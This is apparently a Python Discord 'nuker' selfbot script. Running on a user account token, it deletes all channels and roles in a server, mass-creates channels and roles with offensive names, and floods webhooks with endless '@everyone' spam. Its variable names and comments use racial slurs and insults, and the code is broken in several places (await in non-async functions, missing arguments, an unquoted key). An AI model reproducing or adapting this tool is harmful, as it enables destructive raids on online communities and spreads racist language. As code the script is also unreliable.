import discord
from discord.ext import commands
import threading
import json
from threading import Thread
import asyncio
import threading
from threading import Thread

with open("userconfiguration.json", "r") as jsonfile:
  TOKEN = json.load(jsonfile)[UserAccountToken]

client = commands.Bot(command_prefix="$", self_bot=True)
niggurs = False

@client.command()
async def nok(ctx):
  await ctx.message.delete()
  await asyncio.gather(*[c.delete() for c in ctx.guild.channels])
  await asyncio.gather(*[r.delete() for r in ctx.guild.roles])
  await chnl_spm()
  await role_spm()
  

def chnl_spm():
  for i in range(8):
    threads = []
    nigeria = threading.Thread(target=mozzie)
    nigeria.start()
    
    
def mozzie(ctx):
  try:
      for i in range(500):
          wtf = ctx.message.guild
          await ctx.wtf.create_text_channel("allah-is-back")
  except:
      pass

 
def role_spm():
  for i in range(8):
    threads = []
    zimbawe = threading.Thread(target=pazzo)
    zimbawe.start()

    
def pazzo():
  for i in range(250):
   try:
    await guild.create_role(name="anal")
   except:
    pass
  

@client.command()
async def enable(ctx):
  await ctx.message.delete()
  global niggurs
  niggurs = True
  await print("Event enabled succesfully")


@client.command()
async def disable(ctx):
  await ctx.message.delete()
  global niggurs
  niggurs = False
  await print("Event disabled succesfully")

@client.event
async def on_guild_channel_create(channel):
    while niggurs:
        try:
            webhook = await channel.create_webhook(name="Jesus christ")
            while True: 
                await webhook.send("@everyone haxored")
        except:
         print("Failed to complete action. Webhook event is turned off, Turn it on retard.")
        
client.run("TOKEN", bot=False)

##customize it to your liking or whatever lmao 
##be sure to turn on the channel event before nuking
